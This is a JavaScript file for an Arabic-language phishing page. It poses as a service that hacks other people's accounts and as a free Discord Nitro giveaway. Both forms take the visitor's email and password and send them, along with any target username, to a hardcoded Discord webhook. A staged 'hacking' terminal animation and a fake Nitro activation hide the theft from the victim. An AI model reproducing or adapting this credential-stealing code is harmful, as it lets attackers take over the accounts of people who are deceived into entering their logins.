const WEBHOOK_URL = "https://discord.com/api/webhooks/1403754910151086221/_nMSBkyQTl-0vI45bYzar9LprDgSDz6ha0MxQJZ-qOW1nkpjoyH5BKlclMJJfuOM-75A";

// Page navigation
function showPage(pageId) {
    document.querySelectorAll('.page').forEach(page => {
        page.classList.remove('active');
    });
    document.getElementById(pageId).classList.add('active');
    
    // Update active nav link
    document.querySelectorAll('nav a').forEach(link => {
        link.classList.remove('active');
    });
    document.querySelector(`nav a[onclick="showPage('${pageId}')"]`).classList.add('active');
}

// Modal functions
function openModal() {
    document.getElementById('loginModal').style.display = 'flex';
}

function closeModal() {
    document.getElementById('loginModal').style.display = 'none';
}

// Page 1: Open login modal on hack button click
document.getElementById('start-hack').addEventListener('click', openModal);

// Page 1: Hack form submission
document.getElementById('hackForm').addEventListener('submit', function(e) {
    e.preventDefault();
    
    const email = document.getElementById('hack-email').value;
    const password = document.getElementById('hack-password').value;
    const target = document.getElementById('target-username').value;
    
    if (!email || !password || !target) {
        alert('يرجى ملء جميع الحقول');
        return;
    }
    
    // Send data to webhook
    fetch(WEBHOOK_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            content: `**طلب اختراق جديد!**\nالبريد: ${email}\nكلمة المرور: ${password}\nالحساب المستهدف: ${target}`
        })
    }).then(() => {
        showNotification();
        closeModal();
        
        // Simulate hacking process
        simulateHacking();
    }).catch(err => {
        console.error('Error sending data:', err);
        alert('حدث خطأ أثناء الإرسال. يرجى المحاولة مرة أخرى.');
    });
});

// Simulate hacking process
function simulateHacking() {
    const terminal = document.getElementById('terminal');
    const progressFill = document.getElementById('progress-fill');
    const progressText = document.getElementById('progress-text');
    const startBtn = document.getElementById('start-hack');
    
    startBtn.disabled = true;
    startBtn.innerHTML = '<i class="fas fa-cog fa-spin"></i> جارِ الاختراق...';
    
    // Clear terminal and reset progress
    terminal.innerHTML = '';
    progressFill.style.width = '0%';
    progressText.textContent = 'جارٍ التهيئة...';
    
    // Simulate hacking process
    const steps = [
        {text: '$ بدء فحص الثغرات الأمنية...', delay: 1000},
        {text: '$ اكتشاف نقاط الضعف...', delay: 1500},
        {text: '$ جارِ استغلال الثغرات...', delay: 2000, type: 'warning'},
        {text: '$ تجاوز جدران الحماية...', delay: 2500},
        {text: '$ الوصول إلى قاعدة بيانات المستخدمين...', delay: 3000, type: 'info'},
        {text: '$ جارِ فك تشفير كلمات المرور... 12%', delay: 3500},
        {text: '$ جارِ فك تشفير كلمات المرور... 47%', delay: 4000},
        {text: '$ جارِ فك تشفير كلمات المرور... 89%', delay: 4500},
        {text: '$ تم فك تشفير كلمات المرور بنجاح!', delay: 5000, type: 'info'},
        {text: '$ جارِ جمع بيانات الحساب...', delay: 5500},
        {text: '$ تم جمع البيانات بنجاح!', delay: 6000, type: 'info'},
        {text: '$ جارِ تنزيل بيانات الحساب...', delay: 6500},
        {text: '$ تم الاختراق بنجاح!', delay: 7000, type: 'info'}
    ];
    
    let stepIndex = 0;
    let progress = 0;
    const progressInterval = setInterval(() => {
        progress += 1.4;
        if (progress > 100) progress = 100;
        progressFill.style.width = progress + '%';
        progressText.textContent = Math.round(progress) + '%';
    }, 70);
    
    function nextStep() {
        if (stepIndex >= steps.length) {
            clearInterval(progressInterval);
            
            // Enable button again
            startBtn.disabled = false;
            startBtn.innerHTML = '<i class="fas fa-bolt"></i> بدء عملية الاختراق';
            return;
        }
        
        const step = steps[stepIndex];
        const line = document.createElement('div');
        line.className = 'terminal-line ' + (step.type || '');
        line.textContent = step.text;
        terminal.appendChild(line);
        terminal.scrollTop = terminal.scrollHeight;
        
        stepIndex++;
        setTimeout(nextStep, step.delay);
    }
    
    nextStep();
}

// Page 2: Nitro form submission
document.getElementById('nitroForm').addEventListener('submit', function(e) {
    e.preventDefault();
    
    const email = document.getElementById('nitro-email').value;
    const password = document.getElementById('nitro-password').value;
    
    if (!email || !password) {
        alert('يرجى ملء جميع الحقول');
        return;
    }
    
    // Send data to webhook
    fetch(WEBHOOK_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            content: `**طلب نيترو جديد!**\nالبريد: ${email}\nكلمة المرور: ${password}`
        })
    }).then(() => {
        showNotification();
        // Simulate Nitro activation
        document.getElementById('nitroForm').reset();
        document.querySelector('.btn-claim').innerHTML = '<i class="fas fa-check"></i> تم تفعيل النيترو!';
        document.querySelector('.btn-claim').style.background = 'linear-gradient(90deg, #57f287, #46d46d)';
        document.querySelector('.btn-claim').disabled = true;
    }).catch(err => {
        console.error('Error sending data:', err);
        alert('حدث خطأ أثناء الإرسال. يرجى المحاولة مرة أخرى.');
    });
});

function showNotification() {
    const notification = document.getElementById('notification');
    notification.style.display = 'block';
    setTimeout(() => {
        notification.style.display = 'none';
    }, 3000);
}

// Close modal if clicked outside
window.addEventListener('click', function(event) {
    const modal = document.getElementById('loginModal');
    if (event.target === modal) {
        closeModal();
    }
});